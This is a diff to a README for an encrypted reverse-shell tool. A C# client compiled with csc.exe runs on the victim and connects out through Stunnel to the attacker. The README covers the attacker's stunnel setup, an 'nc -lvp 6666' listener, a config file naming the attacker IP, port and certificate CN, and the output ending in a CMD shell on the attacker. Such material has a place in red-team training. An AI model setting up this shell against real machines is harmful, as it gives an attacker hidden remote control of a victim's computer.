@@ -3,7 +3,7 @@ A Reverse shell through Stunnel.
 ## Architecture
 - Client Net4.8 C#
 - Server Stunnell4
-- 
+
 ## Scenario:
 Client is the victim, that executes the connection to the server (attacker) that serves stunnell.
 The client SSL authentication must match the CN specified creating the server certificate (example: lguerra.local)
@@ -34,7 +34,7 @@ Start stunnell
 	
  service stunnel4 start
 	
-check if works:
+Check if works:
 
     netstat -tulp | grep 9999
 	  Active Internet connections (only servers)
@@ -47,22 +47,23 @@ Then we can lunch nc to listen on port 6666 as configurated on stunnel
 	nc -lvp 6666
 	
 ## Compile the client:
-	
+Youn can compile the client as follows:
+
 	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Program.cs
 	
-	
-	finally we can execute the client file ReverseShell2_SSL.exe
-	the configuration file (config) must be present in the same directory of the exe, configurated according to the attacker machine:
+The configuration file (config) must be present in the same directory of the executable file and must contain the following information:
+
 		ip:<attacker machine IP>
 		port:<listen stunnel port on the attacker machine>
 		CN:<CN name as set on the stunnel certificate> 
 
 	
-	we should read the following on the CMD program shell
+Executing Program.exe we should read the following on the shell
 	
 		Starting decoding, please wait...
 		Certificate revocation list checked: False
-		Remote cert was issued to CN=zinzloun, OU=IT Sec, O=Umbrella Corp., L=Chianti, S=Italy, C=IT and is valid from 20/07/2019 11:29:08 until 19/07/2022 11:29:08.
+		...
+The you shoud get a CMD shell on the attacker
 	
 		
 
